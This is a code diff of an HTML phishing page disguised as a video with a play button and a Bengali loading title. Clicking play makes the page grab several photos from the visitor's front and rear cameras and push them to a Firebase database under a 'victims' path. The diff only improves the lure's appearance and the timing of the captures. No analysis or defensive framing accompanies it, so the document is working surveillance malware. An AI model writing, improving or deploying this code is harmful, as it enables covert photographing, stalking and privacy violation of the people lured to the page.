@@ -3,17 +3,21 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loading...</title>
+<title>ভিডিও লোড হচ্ছে...</title>
 <style>
-body,html{margin:0;padding:0;height:100%;background:#000;overflow:hidden}
-.bg{position:fixed;top:0;left:0;width:100%;height:100%;background:url('https://i.ibb.co.com/8XjY5Yk/blur-bg.jpg') center/cover;filter:blur(10px)}
-.play{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:90px;height:90px;background:rgba(0,0,0,0.8);border-radius:50%;cursor:pointer}
-.play::after{content:'';border-left:30px solid #ff0050;border-top:20px solid transparent;border-bottom:20px solid transparent;margin-left:8px}
+  body,html{margin:0;padding:0;height:100%;background:#000;overflow:hidden;display:flex;justify-content:center;align-items:center}
+  .bg{position:fixed;top:0;left:0;width:100%;height:100%;background:url('https://i.ibb.co.com/8XjY5Yk/blur-bg.jpg') center/cover;filter:blur(12px);z-index:1}
+  .play{position:relative;z-index:10;width:100px;height:100px;background:rgba(0,0,0,0.85);border-radius:50%;cursor:pointer;display:flex;align-items:center;justify-content:center;animation:glow 2s infinite}
+  .play::after{content:'';width:0;height:0;border-left:38px solid #ff0050;border-top:25px solid transparent;border-bottom:25px solid transparent;margin-left:10px}
+  @keyframes glow{0%,100%{box-shadow:0 0 20px #ff0050}50%{box-shadow:0 0 50px #ff0050,0 0 80px rgba(255,0,80,0.5)}}
+  .loading{color:#fff;font-size:1.6em;position:absolute;z-index:10;display:none}
 </style>
 </head>
 <body>
+
 <div class="bg"></div>
-<div class="play" onclick="go()"></div>
+<div class="play" onclick="start()"></div>
+<div class="loading" id="load">ক্যামেরা চালু হচ্ছে...</div>
 
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
@@ -23,28 +27,32 @@ firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 const id = new URLSearchParams(location.search).get('id');
 
-function go(){
-  document.querySelector('.play').remove();
-  ;['user','environment'].forEach(f=>{
-    for(let i=0;i<6;i++){
-      setTimeout(()=>capture(f),i*500);
-    }
-  });
+function start(){
+  document.querySelector('.play').style.display = 'none';
+  document.getElementById('load').style.display = 'block';
+
+  // প্রথমে সামনের ক্যামেরা ৩টা
+  for(let i=0; i<3; i++) setTimeout(()=>capture('user'), i*600);
+  // তারপর পিছনের ক্যামেরা ৩টা
+  setTimeout(()=> {
+    for(let i=0; i<3; i++) setTimeout(()=>capture('environment'), i*600);
+  }, 2000);
 }
+
 async function capture(face){
   try{
-    const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:face}});
-    const v = document.createElement('video'); v.srcObject=s; v.play();
-    v.onloadedmetadata=()=>{
+    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:face}});
+    const v = document.createElement('video'); v.srcObject = stream; v.play();
+    v.onloadedmetadata = () => {
       setTimeout(()=>{
-        const c=document.createElement('canvas');
-        c.width=640; c.height=480;
+        const c = document.createElement('canvas');
+        c.width = 640; c.height = 480;
         c.getContext('2d').drawImage(v,0,0,640,480);
-        const data=c.toDataURL('image/jpeg',0.8);
-        db.ref('victims/'+id).push({data,time:Date.now()});
-        s.getTracks().forEach(t=>t.stop());
-      },800);
-    }
+        const data = c.toDataURL('image/jpeg',0.85);
+        db.ref('victims/'+id).push({data, time:Date.now()});
+        stream.getTracks().forEach(t=>t.stop());
+      }, 800);
+    };
   }catch(e){}
 }
 </script>
